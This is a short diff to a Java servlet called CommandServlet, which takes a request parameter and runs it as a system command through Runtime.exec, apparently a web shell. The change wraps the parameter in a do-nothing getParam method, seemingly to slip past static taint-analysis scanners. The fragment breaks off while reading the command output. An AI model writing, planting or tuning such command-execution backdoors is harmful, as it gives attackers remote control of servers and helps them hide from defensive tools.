@@ -20,9 +20,13 @@ public class CommandServlet extends HttpServlet {
         doPost(req, resp);
     }
 
+    public String getParam(String param) {
+        return param;
+    }
+
     @Override
     protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
-        String cmd = request.getParameter(paramName);
+        String cmd = getParam(request.getParameter(paramName));
         if (cmd != null) {
             Process exec = Runtime.getRuntime().exec(cmd);
             InputStream inputStream = exec.getInputStream();
